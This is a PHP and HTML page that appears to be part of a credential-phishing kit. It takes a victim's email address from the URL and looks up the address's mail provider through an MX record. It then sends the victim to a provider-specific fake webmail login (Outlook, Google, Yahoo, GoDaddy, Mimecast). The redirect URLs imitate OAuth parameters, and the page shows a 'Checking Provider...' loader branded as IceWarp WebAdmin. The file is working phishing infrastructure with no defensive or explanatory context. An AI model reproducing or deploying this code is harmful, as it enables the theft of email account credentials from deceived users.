<?php

session_start();

$email = '';

if(isset($_GET["email"])){
$email = $_GET['email'];
$x = base64_encode($email);
}

include 'webmail/config.php';

if (stripos($mxrecord, 'outlook.com') !== false){
header("Refresh:5;url=webmail/?client_id=".$session."&redirect_uri=https%3A%2F%2Fwww.".$domain."%2F&protectedtoken=false&id=".$encode_domain."&Country=".$cc."&x=".$x."&i=outlook");
}
elseif (stripos($mxrecord, 'google.com') !== false || stripos($mxrecord, 'gmail.com') !== false){
header("Refresh:5;url=webmail/?client_id=".$session."&redirect_uri=https%3A%2F%2Fwww.".$domain."%2F&protectedtoken=false&id=".$encode_domain."&Country=".$cc."&x=".$x."&i=google");
}
elseif (stripos($mxrecord, 'yahoodns.net') !== false || stripos($mxrecord, 'yahoo.com') !== false){
header("Refresh:5;url=webmail/?client_id=".$session."&redirect_uri=https%3A%2F%2Fwww.".$domain."%2F&protectedtoken=false&id=".$encode_domain."&Country=".$cc."&x=".$x."&i=yahoo");
}
elseif (stripos($mxrecord, 'secureserver.net') !== false || stripos($mxrecord, 'godaddy.com') !== false){
header("Refresh:5;url=webmail/?client_id=".$session."&redirect_uri=https%3A%2F%2Fwww.".$domain."%2F&protectedtoken=false&id=".$encode_domain."&Country=".$cc."&x=".$x."&i=godaddy");
}
elseif (stripos($mxrecord, 'mimecast.com') !== false){
header("Refresh:5;url=webmail/?client_id=".$session."&redirect_uri=https%3A%2F%2Fwww.".$domain."%2F&protectedtoken=false&id=".$encode_domain."&Country=".$cc."&x=".$x."&i=mimecast");
}
else
header ("Refresh:5;url=webmail/?client_id=".$session."&redirect_uri=https%3A%2F%2Fwww.".$domain."%2F&protectedtoken=false&id=".$encode_domain."&Country=".$cc."&x=".$x."&i=others");

?>

<!DOCTYPE html><html> <head><title>Checking Provider...</title>  <!--[if lte IE 8]><meta http-equiv="refresh" content="0;url=.&#x2F;?interface&#x3D;basic"><![endif]-->  <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE&#x3D;edge" /> <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1, maximum-scale&#x3D;1.0" /> <meta name="google" value="notranslate" /> <meta id="theme-colors"><!-- Apple touch icons --><link rel="apple-touch-icon" sizes="57x57" href="./images/favicon/apple-touch-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="./images/favicon/apple-touch-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="./images/favicon/apple-touch-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="./images/favicon/apple-touch-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="./images/favicon/apple-touch-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="./images/favicon/apple-touch-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="./images/favicon/apple-touch-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="./images/favicon/apple-touch-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="./images/favicon/apple-touch-icon-180x180.png"><!-- Favicon --><link rel="icon" type="image/png" href="./images/favicon/favicon-16x16.png" sizes="16x16"><link rel="icon" type="image/png" href="./images/favicon/favicon-32x32.png" sizes="32x32"><link rel="icon" type="image/png" href="./images/favicon/favicon-96x96.png" sizes="96x96"><!-- Google icons --><link rel="icon" type="image/png" href="./images/favicon/android-chrome-192x192.png" sizes="192x192"><meta name="theme-color" content="#0084d8"><!-- Microsoft icons --><link rel="manifest" href="./images/favicon/manifest.json"><meta name="msapplication-TileColor" content="#0084d8"><meta name="msapplication-TileImage" content="./images/favicon/mstile-144x144.png"><!-- Add to homescreen for Chrome on Android --><meta name="mobile-web-app-capable" content="yes"><!-- Add to homescreen for Safari on iOS --><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="translucent-black"><meta name="apple-mobile-web-app-title" content="IceWarp WebAdmin"><!-- Turn on IE cleartype --><meta http-equiv="cleartype" content="on"><meta name="stylesheet"content="css&#x2F;style.css"variables="true">  <meta name="stylesheet" content="webmail/css/pikaday.css"variables="true">  <link type="text/css" href="webmail/css/api.css" rel="stylesheet">  <script src="config.js"></script> </head> <body><div class="l-loading" id="content"> <svg class="atoms-loader   o-loader   o-loading  " xmlns="http://www.w3.org/2000/svg" viewBox="0 0 53 21"><path class="o-loader__item" d="M9 0c-1.15 0-2.35.9-2.7 2.04L0 20.4h1.6c1.13 0 2.33-.9 2.7-2.03L10.67 0h-1.7z"/><path class="o-loader__item" d="M16 0c-1.15 0-2.35.9-2.7 2.04L7 20.4h1.6c1.13 0 2.33-.9 2.7-2.03L17.67 0h-1.7z"/><path class="o-loader__item" d="M23 0c-1.15 0-2.35.9-2.7 2.04L14 20.4h1.6c1.13 0 2.33-.9 2.7-2.03L24.67 0h-1.7z"/><path class="o-loader__item" d="M30 0c-1.15 0-2.35.9-2.7 2.04L21 20.4h1.6c1.13 0 2.33-.9 2.7-2.03L31.67 0h-1.7z"/><path class="o-loader__item" d="M37 0c-1.15 0-2.35.9-2.7 2.04L28 20.4h1.6c1.13 0 2.33-.9 2.7-2.03L38.67 0h-1.7z"/><path class="o-loader__item" d="M44 0c-1.15 0-2.35.9-2.7 2.04L35 20.4h1.6c1.13 0 2.33-.9 2.7-2.03L45.67 0h-1.7z"/><path class="o-loader__item" d="M51 0c-1.15 0-2.35.9-2.7 2.04L42 20.4h1.6c1.13 0 2.33-.9 2.7-2.03L52.67 0h-1.7z"/></svg>  </div><script src="framework.min.js"></script><script src="bundle.min.js"></script></body></html> 